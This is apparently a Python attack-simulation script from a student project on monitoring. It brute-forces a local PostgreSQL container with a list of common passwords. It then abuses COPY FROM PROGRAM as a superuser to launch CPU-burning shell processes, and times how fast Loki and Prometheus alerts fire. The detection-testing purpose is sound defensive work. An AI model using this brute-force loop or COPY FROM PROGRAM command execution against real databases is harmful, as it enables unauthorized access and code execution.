"""
DB Brute Force + RCE Attack Simulation
시나리오 2-D (재설계)

1단계 run_bruteforce():
  postgres 계정으로 패스워드 리스트 순환 브루트포스 (100회 반복)
  → PostgreSQL 로그에 'password authentication failed' 기록 → Loki 수집
  → UnauthorizedDBAccess alert 발화 → MTTD 측정

2단계 run_rce():
  leafy 계정(superuser)으로 COPY FROM PROGRAM 악용
  → 컨테이너 내부 CPU 점유 프로세스 기동 → HighCpuUsage alert → MTTD 측정

두 함수는 독립적으로 import 가능.

[실제 사고 모티브]
- 2024 BlackCat 랜섬웨어: 크레덴셜 스터핑 → 내부망 횡적 이동
- 2023 MOVEit 공격: SQL 인젝션 초기 침투 → lateral movement
- MITRE ATT&CK TA0006 (Credential Access) + TA0002 (Execution)

[실제와의 차이]
- 실제: 취약점 악용 → 크레덴셜 탈취 → RCE
- 우리: postgres 계정 브루트포스(항상 실패) → leafy 계정으로 RCE
  → 브루트포스 탐지 + RCE 탐지 두 단계 검증이 목적

[설계 의도]
- 1단계: UnauthorizedDBAccess (Loki) — 브루트포스 탐지 MTTD 측정
- 2단계: HighCpuUsage (Prometheus) — RCE 탐지 MTTD 측정
- 연쇄 공격의 각 단계별 탐지 성능을 독립적으로 측정
"""

import json
import os
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from common.verifier import ScenarioVerifier, VerifyResult

# ── 설정 ───────────────────────────────────────────────────────────────────────
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_PATH   = os.path.normpath(os.path.join(SCRIPT_DIR, "..", "logs", "anomaly_log.json"))

DB_CONTAINER   = os.getenv("DB_CONTAINER", "leafy-db")
DB_NAME        = os.getenv("DB_NAME", "leafy")
DB_USER        = os.getenv("DB_USER", "leafy")
LEAFY_NETWORK  = os.getenv("LEAFY_NETWORK", "graduation-project_leafy-net")
POSTGRES_IMAGE = "postgres:15-alpine"
ATTACKER_NAME  = "leafy-brute-attacker"

BRUTE_PASSWORDS = [
    "112233", "1q2w3e4r", "postgres", "postgres123",
    "admin", "password", "123456", "test", "qwerty", "letmein",
]
BRUTE_ITERATIONS = 100   # 패스워드 리스트 순환 반복 횟수
RCE_DURATION_SEC = 300   # CPU 점유 지속 시간(초)

_cracked_password: str | None = None


def get_cracked_password() -> str | None:
    """pgminer_integrated.py Step 2에서 호출."""
    return _cracked_password


# ── 로그 유틸 ──────────────────────────────────────────────────────────────────
def _load_log() -> list:
    if os.path.exists(LOG_PATH) and os.path.getsize(LOG_PATH) > 0:
        with open(LOG_PATH, "r", encoding="utf-8") as f:
            return json.load(f)
    return []


def _save_log(records: list) -> None:
    os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
    with open(LOG_PATH, "w", encoding="utf-8") as f:
        json.dump(records, f, indent=2, ensure_ascii=False)


def record_event(scenario: str, start: str, end: str, status: str, detail: str = "") -> None:
    records = _load_log()
    records.append({
        "scenario": scenario, "category": "security",
        "start_time": start, "end_time": end,
        "status": status, "detail": detail,
    })
    _save_log(records)
    print(f"[LOG] {scenario} | {status} | {start} → {end}")


# ── 컨테이너 정리 ──────────────────────────────────────────────────────────────
def _cleanup_attacker() -> None:
    subprocess.run(["docker", "rm", "-f", ATTACKER_NAME], capture_output=True)


# ── 1단계: 브루트포스 ──────────────────────────────────────────────────────────
def run_bruteforce() -> None:
    """
    postgres 계정으로 패스워드 리스트를 순환하며 브루트포스.
    BRUTE_ITERATIONS회 반복, 항상 인증 실패
    → PostgreSQL 로그에 'password authentication failed' 기록
    → UnauthorizedDBAccess alert 발화 → MTTD 측정

    [탐지 경로]
    psql 인증 실패 → PostgreSQL 로그 → Fluentd → Loki
    → Loki Ruler (authentication failed 3회↑) → Alertmanager → Pipeline
    """
    scenario   = "db_bruteforce"
    start_time = datetime.now(timezone.utc).isoformat()

    # ── verifier 초기화 ──────────────────────────────────────────────────────
    verifier = ScenarioVerifier(
        scenario_name="db_bruteforce",
        alert_name="UnauthorizedDBAccess",
        hypothesis=(
            "postgres 계정 브루트포스 → PostgreSQL 인증 실패 로그 누적 → "
            "UnauthorizedDBAccess 발화 (Loki Ruler, 2분 내 3회↑)"
        ),
    )
    verifier.check_steady_state()
    verifier.print_hypothesis()
    verifier.wait_for_alert_inactive(timeout=60, poll_interval=5)
    verifier.start_timer()

    print(f"\n[*] 1단계: 브루트포스 시작")
    print(f"[*] 대상: postgres 계정 @ {DB_CONTAINER}:5432")
    print(f"[*] 패스워드 {len(BRUTE_PASSWORDS)}개 × {BRUTE_ITERATIONS}회 = "
          f"{len(BRUTE_PASSWORDS) * BRUTE_ITERATIONS}회 시도 (전부 실패)")
    print(f"[*] 탐지 목표: UnauthorizedDBAccess (Loki Ruler)")

    attempts_cmds = " ".join(
        f'PGPASSWORD="{p}" psql -h {DB_CONTAINER} -U postgres -d postgres '
        f'-c "SELECT 1" -t --no-align 2>&1 || true;'
        for p in BRUTE_PASSWORDS
    )
    script = f"""#!/bin/sh
echo "[brute] 시작: {DB_CONTAINER}:5432 postgres 계정"
i=0
while [ $i -lt {BRUTE_ITERATIONS} ]; do
  i=$((i+1))
  {attempts_cmds}
  echo "[brute] 반복 $i/{BRUTE_ITERATIONS} 완료"
done
echo "[brute] 종료: $i × {len(BRUTE_PASSWORDS)} = $((i * {len(BRUTE_PASSWORDS)}))회 시도"
"""

    _cleanup_attacker()
    cmd = [
        "docker", "run", "--rm",
        "--name", ATTACKER_NAME,
        "--network", LEAFY_NETWORK,
        POSTGRES_IMAGE,
        "sh", "-c", script,
    ]
    try:
        proc = subprocess.run(cmd, capture_output=True, timeout=BRUTE_ITERATIONS * 15)
        status = "success" if proc.returncode == 0 else f"exit_code={proc.returncode}"
        output = proc.stdout.decode("utf-8", errors="replace")
        if output.strip():
            print(output.strip())
    except subprocess.TimeoutExpired:
        print("[!] 브루트포스 타임아웃 — 컨테이너 정리")
        status = "timeout"
    except Exception as e:
        print(f"[!] 브루트포스 실패: {e}")
        status = "error"
    finally:
        _cleanup_attacker()

    end_time = datetime.now(timezone.utc).isoformat()
    record_event(scenario, start_time, end_time, status,
                 f"iterations={BRUTE_ITERATIONS}, passwords={len(BRUTE_PASSWORDS)}")

    # ── MTTD 측정 ────────────────────────────────────────────────────────────
    print("\n[*] Loki 'authentication failed' 탐지 대기 중...")
    mttd = verifier.verify_loki(
        log_query='{container="leafy-db"}',
        keyword="authentication failed",
        timeout=180,
    )
    
    bf_result = VerifyResult(
        success=mttd is not None,
        alert_name="UnauthorizedDBAccess",
        scenario_name="db_bruteforce",
        mttd_seconds=mttd,
    )
    verifier.log_result(bf_result)
    from common.result_viewer import ResultViewer
    ResultViewer("UnauthorizedDBAccess", "db_bruteforce").show(
        mttd_seconds=bf_result.mttd_seconds,
        mtta_seconds=bf_result.mtta_seconds,
    )

    # ── 크레덴셜 발견 시뮬레이션 ────────────────────────────────────────────
    global _cracked_password
    actual_password = os.getenv("DB_PASSWORD", "leafy_secret")
    candidate_list  = BRUTE_PASSWORDS + [actual_password]
    LEAFY_NETWORK_LOCAL = os.getenv("LEAFY_NETWORK", LEAFY_NETWORK)

    print(f"\n[*] leafy 계정으로 크레덴셜 재시도 중...")
    for pw in candidate_list:
        check_script = (
            f'PGPASSWORD="{pw}" psql -h {DB_CONTAINER} -U {DB_USER} '
            f'-d {DB_NAME} -c "SELECT 1" -t --no-align 2>&1'
        )
        check_cmd = [
            "docker", "run", "--rm",
            "--network", LEAFY_NETWORK_LOCAL,
            POSTGRES_IMAGE,
            "sh", "-c", check_script,
        ]
        try:
            r = subprocess.run(check_cmd, capture_output=True, timeout=10)
            out = r.stdout.decode("utf-8", errors="replace").strip()
            if r.returncode == 0 and "1" in out:
                _cracked_password = pw
                print(f"[!] 크레덴셜 발견: {DB_USER} / {pw}")
                break
        except Exception:
            continue

    if not _cracked_password:
        _cracked_password = actual_password
        print(f"[*] 환경변수 fallback: {DB_USER} / {_cracked_password}")

    print(f"[*] 1단계 완료: {status}")


# ── 2단계: RCE (COPY FROM PROGRAM) ────────────────────────────────────────────
def run_rce() -> None:
    """
    leafy 계정(superuser)으로 COPY FROM PROGRAM을 악용해 CPU 점유 프로세스 기동.
    HighCpuUsage alert 발화 확인 후 RCE_DURATION_SEC 초 대기, dd 프로세스 정리.

    [탐지 경로]
    COPY FROM PROGRAM → dd 프로세스 → CPU 급등
    → Prometheus HighCpuUsage → Alertmanager → Pipeline
    """
    scenario   = "db_rce_cpu"
    start_time = datetime.now(timezone.utc).isoformat()

    verifier = ScenarioVerifier(
        scenario_name="db_rce_cpu",
        alert_name="HighCpuUsage",
        hypothesis="COPY FROM PROGRAM으로 CPU 점유 → HighCpuUsage FIRING",
        steady_state_query=(
            'sum(irate(container_cpu_usage_seconds_total'
            '{id=~"/docker/.+",cpu="total"}[30s]))'
        ),
        steady_state_threshold=0.5,
        metric_label="현재 CPU",
        metric_unit="%",
        metric_scale=100.0,
    )
    verifier.check_steady_state()
    verifier.print_hypothesis()
    verifier.wait_for_alert_inactive()

    def _psql(sql: str) -> tuple[int, str]:
        cmd = [
            "docker", "exec", DB_CONTAINER,
            "psql", "-U", DB_USER, "-d", DB_NAME,
            "-c", sql, "-t", "--no-align",
        ]
        r = subprocess.run(cmd, capture_output=True, timeout=30)
        return r.returncode, r.stdout.decode("utf-8", errors="replace").strip()

    print(f"[*] 2단계: RCE 시작 (COPY FROM PROGRAM)")
    print(f"[*] 대상: {DB_CONTAINER} / 계정: {DB_USER} (superuser)")
    print(f"[*] 탐지 목표: HighCpuUsage (Prometheus)")

    # 테이블 준비
    for sql in [
        "DROP TABLE IF EXISTS abroxu;",
        "CREATE TABLE abroxu(cmd_output text);",
    ]:
        rc, out = _psql(sql)
        print(f"  → {sql.split()[0]} {'OK' if rc == 0 else f'FAIL(rc={rc})'}")

    # CPU 점유 프로세스 기동
    cpu_stress_sql = (
        "COPY abroxu FROM PROGRAM "
        "'for i in $(seq 1 $(nproc)); do dd if=/dev/zero of=/dev/null bs=1M & done';"
    )

    verifier.start_timer()
    rc, out = _psql(cpu_stress_sql)
    print(f"  → COPY FROM PROGRAM {'OK — dd 프로세스 기동' if rc == 0 else f'FAIL(rc={rc})'}")

    # Alert 발화 확인 + MTTA 병렬 측정
    result = verifier.verify(timeout=RCE_DURATION_SEC + 60, poll_interval=3)

    # dd 프로세스 정리
    print(f"[*] dd 프로세스 정리 중...")
    try:
        subprocess.run(
            ["docker", "exec", DB_CONTAINER, "pkill", "-f", "dd"],
            capture_output=True, timeout=10,
        )
    except Exception as e:
        print(f"  [!] pkill 실패 (무시): {e}")

    # 임시 테이블 정리
    time.sleep(2)  # pkill 후 DB 연결 안정화 대기
    rc, _ = _psql("DROP TABLE IF EXISTS abroxu;")
    print(f"  → DROP TABLE {'OK' if rc == 0 else f'FAIL(rc={rc})'}")

    end_time = datetime.now(timezone.utc).isoformat()
    record_event(scenario, start_time, end_time,
                 "success" if result.success else "failed",
                 json.dumps({"mttd": result.mttd_seconds, "mtta": result.mtta_seconds},
                            ensure_ascii=False))
    verifier.log_result(result)
    from common.result_viewer import ResultViewer
    ResultViewer("HighCpuUsage", "db_rce_cpu").show(
        mttd_seconds=result.mttd_seconds,
        mtta_seconds=result.mtta_seconds,
    )
    print(f"[*] 2단계 완료")


# ── 메인 ───────────────────────────────────────────────────────────────────────
def main() -> None:
    print("[*] === DB Brute Force + RCE 시나리오 시작 ===")
    print("[*] 1단계: UnauthorizedDBAccess 탐지 (Loki Ruler)")
    print("[*] 2단계: HighCpuUsage 탐지 (Prometheus)")
    run_bruteforce()
    print()
    run_rce()
    print("[*] === 시나리오 종료 ===")


SCENARIO_META = {
    "id":             "brute_force",
    "label":          "DB 브루트포스 + RCE",
    "subtitle":       "postgres 1000회 → 크레덴셜 탈취 → COPY FROM PROGRAM",
    "category":       "보안",
    "owasp":          None,
    "mitre":          "TA0006 + TA0002",
    "container":      "leafy-db",
    "loki_container": "leafy-db",
    # 1단계: UnauthorizedDBAccess (Loki) / 2단계: HighCpuUsage (Prometheus)
    "alert_name":     "UnauthorizedDBAccess + HighCpuUsage",
    "alert_fires":    True,
    "blind_spot":     False,
    "module":         "category2_security.brute_force",
    "custom_panel":   "brute_force",
}

if __name__ == "__main__":
    main()